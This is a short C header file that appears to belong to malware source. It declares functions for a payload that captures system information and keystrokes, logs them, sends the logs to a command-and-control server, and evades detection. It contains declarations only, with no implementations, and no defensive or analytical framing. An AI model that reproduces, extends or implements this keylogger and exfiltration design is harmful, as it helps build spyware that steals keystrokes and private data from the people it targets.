#ifndef PAYLOAD_H
#define PAYLOAD_H

#include <stdio.h>
#include <stdlib.h>

// Payload Functions
void init_payload();
void run_payload();
void cleanup_payload();

// Logging Functions
void init_logging();
void log_message(const char* format, ...);
void cleanup_logging();

// System Capture Functions
void capture_system_info();
void capture_keystrokes();

// C2 Communication Functions
void init_c2_communication();
void send_logs_to_c2();
void cleanup_c2_communication();

// Evasion Functions
void init_evasion();

#endif // PAYLOAD_H